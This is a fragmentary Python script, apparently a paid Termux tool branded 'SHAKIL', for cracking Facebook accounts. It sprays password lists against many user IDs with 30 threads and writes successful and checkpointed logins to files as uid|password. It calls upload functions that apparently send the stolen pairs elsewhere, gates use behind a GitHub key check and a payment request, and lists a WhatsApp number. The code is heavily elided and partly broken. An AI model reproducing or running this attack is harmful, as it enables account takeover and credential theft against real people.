...
\033[1;35;1m╰━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━╯
  ...
  \033[1;31;1m█ \033[1;37m [•] \033[1;32;1mFACEBOOK PAGE   \033[1;37m [•]\033[1;32m  ║║ \033[1;37m [•] \033[1;32m  SHAKIL AHMED     \033[1;37m[•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;33;1mGITHUB USER     \033[1;37m [•]\033[1;32m  ║║ \033[1;37m [•] \033[1;33m  SHAKIL-1-2     \033[1;37m[•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;34;1mWHATS APP NUMBER\033[1;37m [•]  \033[1;32m║║ \033[1;37m [•] \033[1;34m*8801752363921 \033[1;37m[•]  \033[1;31m█ 
	...
	def psy(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD SHAKIL 6 CHARACTERS"%(R))
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD SHAKIL 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> SHAKIL-ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> SHAKIL-cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				print("\033[1;97m===============================================================")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
	...
	def old4_7(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> SHAKIL-ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> SHAKIL-cp.txt"%(R))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				print("\033[1;97m===============================================================")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> SHAKIL-CP.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> SHAKIL-CP.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				print("\033[1;97m===============================================================")
				for user in self.id:
	...
	def email(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> SHAKIL-ok.txt"%(G))
				print("%s [+] CP RESULT SAVED IN -> SHAKIL-cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				print("\033[1;97m===============================================================")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SHAKIL-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [SHAKIL-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[SHAKIL-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SHAKIL-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
...
#except Exception as e:exit(str(e))
       key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()
        ...
        os.system('am start https://wa.me/01752363921?text=' + tks
               

    r1=requests.get("https://github.com/SHAKIL-1-2/Ummm/tree/main").text
    ...
    if key1 in r1:
        ...
        print ("         ༄•───────────────────────────────────────•༄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL SHAKIL")     
